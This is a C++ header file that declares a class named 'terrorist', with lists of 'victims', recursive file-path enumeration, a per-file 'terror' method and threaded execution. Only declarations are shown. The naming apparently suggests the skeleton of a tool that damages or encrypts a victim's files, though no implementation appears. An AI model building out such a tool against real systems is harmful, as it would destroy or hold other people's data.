#pragma once
#include <string>
#include <filesystem>
#include <vector>
#include <iostream>
#include <list>
#include <thread>
#include <fstream>
#include <mutex>

class terrorist{
public:
    terrorist(std::string main_victim);

private:
    std::list<std::string> victims;

    std::list<std::string> current_terrorism;

    auto get_iterator(const std::list<std::string> &list, const std::string &copy);

    std::string main_path;

    std::vector<std::string> get_all_paths(std::string &root_path);

    void dir_work(std::string root_dir);

    void load_list();

    void terror(std::string &victim_path);

    void execution();

    std::mutex lock;

};

